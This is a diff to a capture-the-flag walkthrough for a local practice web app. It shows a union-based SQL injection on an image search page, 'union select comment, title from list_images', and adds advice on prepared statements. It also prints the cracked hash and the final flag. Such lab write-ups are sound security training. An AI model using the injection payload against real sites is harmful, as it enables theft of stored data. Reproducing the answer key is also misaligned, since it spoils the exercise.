@@ -1,12 +1,15 @@
 [ Walkthrough ]
 
-Using the same method as the 5th exploit, launch :
-5 union select comment, title from list_images
+Go to : http://192.168.99.100/?page=searchimg
+Using the same method as the Members SQL Injection, we know there is a table called 'list_images' with column names id, url, title, comment.
 
-Output :
+We can play around, but it gets interesting when using : 1=1  union select comment, title from list_images
+We can see :
 [Title] Title: Hack me ?
 [Comment] Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
-	-> md5 decoded : albatroz
-	-> sha256 hash : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+md5 decoded : albatroz
+sha256 hash : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
 
-FLAG : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+We now have the flag.
+
+How to prevent : as usual with SQL injections, never trust the user input. Always prepare SQL statements before executing them, in PHP it can be done using PDO (PDO->prepare). Knowing the database structure and being able to access it without security really is dangerous.
